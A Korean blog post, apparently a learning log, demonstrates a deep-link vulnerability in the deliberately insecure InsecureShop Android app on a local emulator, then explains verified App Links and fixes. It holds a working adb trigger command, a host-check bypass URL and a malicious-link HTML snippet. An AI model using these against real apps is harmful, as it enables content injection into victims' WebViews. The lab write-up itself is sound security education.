---
layout: post
title: "[Android 앱 보안 S08] Deep Link와 App Link"
date: 2026-09-02 16:00:00 +0900
category: 안드로이드
author: WTCY
tags: [Android, AndroidSecurity, 모바일보안, DeepLink, AppLink, 커스텀스킴, assetlinks, WebView, InsecureShop, 학습기록]
excerpt: "웹페이지의 링크 한 줄로 앱을 열 수 있다면, 그 링크가 앱에 무엇을 시키는지가 중요합니다. InsecureShop의 insecureshop:// 커스텀 스킴은 브라우저에서 열리고, /web 경로는 넘겨받은 url을 검증 없이 WebView에 로드합니다. 로컬 테스트 서버의 임의 페이지를 이 딥링크로 앱 안에 띄워, 커스텀 스킴이 왜 소유권을 증명하지 못하는지와 검증된 App Link가 무엇을 다르게 하는지 정리했습니다."
---

> S07의 WebView2Activity에 이어, 이번엔 그 형제인 WebViewActivity로 들어가는 정문 — 딥링크를 봅니다. 웹 링크 하나로 앱이 임의 페이지를 열게 만드는 경로입니다.

딥링크는 편리한 만큼 신뢰 경계가 흐려지기 쉽습니다. 특히 커스텀 스킴(`myapp://`)은 누구 것이라고 증명할 방법이 없어서, 아무 웹페이지나 그 링크를 걸 수 있고 다른 앱이 같은 스킴을 가로챌 수도 있습니다. InsecureShop의 `insecureshop://`가 그렇고, 그 딥링크가 넘겨받은 URL을 검증 없이 WebView에 로드하기까지 합니다. 로컬 테스트 서버로 그 경로를 실제로 태워 봤습니다.

---

## 실습 목표

- 커스텀 스킴 딥링크가 브라우저(웹 링크)에서 트리거되는 성질을 확인한다.
- 딥링크가 넘긴 `url`을 앱이 검증 없이 WebView에 로드하는지 확인한다.
- 호스트 검증 로직(있다면)의 견고함을 확인한다.
- 커스텀 스킴과 검증된 App Link(assetlinks.json)의 차이를 정리한다.

---

## 윤리적 범위와 허가 조건

피해 앱은 내가 소유한 InsecureShop이고, 딥링크가 로드한 페이지는 내 호스트에서 띄운 로컬 테스트 서버(`http://10.0.2.2`)의 파일입니다. 실제 외부 도메인은 쓰지 않았고, 모든 조작은 `aas-api33` 에뮬레이터 안입니다.

---

## 환경 및 도구 버전

- 대상 기기: `aas-api33` (S01), 피해 앱: `com.insecureshop` (S02)
- 로컬 서버: 호스트의 `python -m http.server`(에뮬레이터에서 `10.0.2.2`로 매핑, S01)
- 정적 근거: S03 디컴파일 결과

---

## 위협 모델 — 딥링크로 무엇까지

- 이 딥링크는 웹 링크로도 트리거되는가(BROWSABLE)?
- 넘어온 `url`을 앱이 검증 없이 로드하는가?
- 호스트 검증이 있다면 우회 가능한가?
- 이 스킴의 소유권을 증명할 수단이 있는가(App Link 여부)?

---

## 재현 절차

### 1. 딥링크 선언과 URL 처리 (정적)

S03에서 본 매니페스트의 딥링크입니다.

```xml
<activity android:name="com.insecureshop.WebViewActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:host="com.insecureshop" android:scheme="insecureshop"/>
    </intent-filter>
</activity>
```

`insecureshop://com.insecureshop/...` 딥링크가 `BROWSABLE`이라 웹페이지의 링크로도 열립니다. 그리고 디컴파일한 `WebViewActivity`의 URL 처리는 경로에 따라 갈립니다.

```java
Uri uri = getIntent().getData();
if (uri.getPath().equals("/web")) {
    data = uri.getQueryParameter("url");          // 검증 전혀 없음
} else if (uri.getPath().equals("/webview")) {
    String q = uri.getQueryParameter("url");
    if (q.endsWith("insecureshopapp.com"))        // 약한 호스트 검사
        data = uri.getQueryParameter("url");
}
webview.loadUrl(data);
```

`/web` 경로는 넘어온 `url`을 아무 검사 없이 로드합니다. `/webview` 경로엔 검사가 있긴 한데, `endsWith("insecureshopapp.com")`이라 문자열이 그 값으로 끝나기만 하면 통과합니다. `http://attacker/insecureshopapp.com` 같은 URL로 쉽게 넘깁니다.

### 2. 딥링크로 임의 페이지 로드

호스트에 로컬 테스트 서버를 띄우고, `/web` 딥링크로 그 페이지를 앱 WebView에 로드시켰습니다. 커스텀 스킴이라 `am start`(웹 링크 클릭과 동치)로 트리거합니다.

```console
$ python -m http.server 8009 --bind 127.0.0.1     # 호스트에서
$ adb shell am start -a android.intent.action.VIEW \
        -d "insecureshop://com.insecureshop/web?url=http://10.0.2.2:8009/attacker.html"
Starting: Intent { act=android.intent.action.VIEW dat=insecureshop://com.insecureshop/... }
```

WebViewActivity가 넘어온 `url`을 그대로 로드했고, 그 값이 앱에 기록되기까지 했습니다.

```console
$ adb shell run-as com.insecureshop cat .../shared_prefs/Prefs.xml | grep data
<string name="data">http://10.0.2.2:8009/attacker.html</string>
```

웹페이지에 `<a href="insecureshop://com.insecureshop/web?url=http://attacker/...">` 한 줄만 있으면 같은 일이 벌어집니다. 사용자가 링크를 누르는 순간, 앱이 공격자 페이지를 자기 WebView 안에서 엽니다.

---

## 스크린샷

딥링크로 로드된 로컬 테스트 서버의 공격자 페이지입니다. 제목은 WebViewActivity의 "Webview", 본문은 내가 서버에 올린 임의 HTML이고, 페이지 안 자바스크립트가 실제 로드된 주소(`http://10.0.2.2:8009/attacker.html`)를 찍어 라이브로 렌더됐음을 보여 줍니다.

![insecureshop:// 딥링크로 WebViewActivity에 로드된 공격자 페이지 — 초록 배경에 "DEEP-LINK PWNED", "검증 없이 이 임의(공격자) 페이지가 앱 WebView에 로드됐다", "loaded href = http://10.0.2.2:8009/attacker.html"](/assets/img/android-app-security/S08/01-deeplink.png)

공격자 HTML과 딥링크 명령·로드된 URL 기록은 `assets/evidence/android-app-security/S08/`에 남겼습니다.

---

## 커스텀 스킴 vs 검증된 App Link

이 딥링크의 근본 문제는 두 가지입니다.

- 소유권 증명이 없다. `insecureshop://`는 커스텀 스킴이라, 이 스킴이 이 앱 것이라는 걸 시스템이 확인하지 못합니다. 다른 앱이 같은 스킴을 등록하면 충돌하고(스킴 하이재킹), 아무 웹페이지나 이 링크를 걸 수 있습니다.
- 넘어온 URL을 신뢰한다. 위에서 본 `/web`의 무검증, `/webview`의 우회 가능한 검사가 그렇습니다.

검증된 App Link는 이 둘을 막습니다. `http(s)` 스킴에 `android:autoVerify="true"`를 걸고, 도메인 루트에 `/.well-known/assetlinks.json`으로 "이 도메인은 이 앱(패키지+서명)과 연결됐다"를 선언하면, 시스템이 설치 시 그 파일을 확인합니다. 그러면 그 도메인 링크는 브라우저를 거치지 않고 검증된 이 앱으로만 열리고, 스킴 충돌도 없습니다. InsecureShop에는 `autoVerify`도 `assetlinks.json`도 없습니다 — 애초에 커스텀 스킴이라 검증 대상이 아닙니다.

---

## 관측 결과

- `insecureshop://com.insecureshop`은 BROWSABLE 커스텀 스킴이라 웹 링크로 트리거된다.
- `/web` 경로는 넘어온 `url`을 검증 없이 WebView에 로드한다. 로컬 서버의 임의 페이지가 앱 안에서 렌더됐다.
- `/webview` 경로의 `endsWith` 호스트 검사는 문자열만 맞추면 우회된다.
- 이 앱엔 검증된 App Link(autoVerify/assetlinks.json)가 없다.

---

## 근본 원인과 보안 영향

- 커스텀 스킴은 소유권을 증명하지 못합니다. 그래서 "이 앱만 여는 링크"라는 보장이 없고, 웹·타 앱 어디서든 트리거·충돌이 가능합니다.
- 넘어온 URL을 검증 없이 WebView에 로드하면, 딥링크가 그대로 임의 콘텐츠 주입 통로가 됩니다(그 WebView가 JS·파일 접근을 켜 두면 피해는 더 커집니다 — S09).
- `endsWith` 같은 문자열 기반 호스트 검사는 우회됩니다. 호스트 검증은 파싱된 `Uri.getHost()`의 정확 일치여야 합니다.

## 수정 방법

- 민감한 진입은 커스텀 스킴 대신 검증된 App Link(`http(s)` + `autoVerify` + `assetlinks.json`)로 만든다.
- 딥링크로 받은 URL은 절대 그대로 로드하지 않는다. 로드할 대상은 앱이 정한 화이트리스트여야 한다.
- 호스트 검증은 `Uri.getHost()`를 정확 일치(또는 정식 서브도메인 규칙)로 확인한다. `endsWith`/`contains`는 쓰지 않는다.

수정 전후는 검사 한 줄의 차이입니다.

```java
// 전: 문자열 끝만 확인 (우회됨)
if (url.endsWith("insecureshopapp.com")) load(url);
// 후: 파싱된 호스트를 정확 일치로
if ("insecureshopapp.com".equals(Uri.parse(url).getHost())) load(url);
```

---

## 재검증

딥링크 트리거 후 최상단은 WebViewActivity였고, WebView에는 로컬 서버의 공격자 HTML이 렌더됐으며(내부 JS가 로드 주소를 찍음), 앱의 `Prefs.data`에 로드된 URL이 그대로 기록됐습니다. 세 지점이 "딥링크가 넘긴 임의 URL을 앱이 로드했다"를 함께 가리킵니다.

---

## 참고 자료

- Android Developers — 딥링크, App Link, `autoVerify`
- Android Developers — Digital Asset Links(`assetlinks.json`)
- Android Developers — `Uri.getHost()` 기반 검증
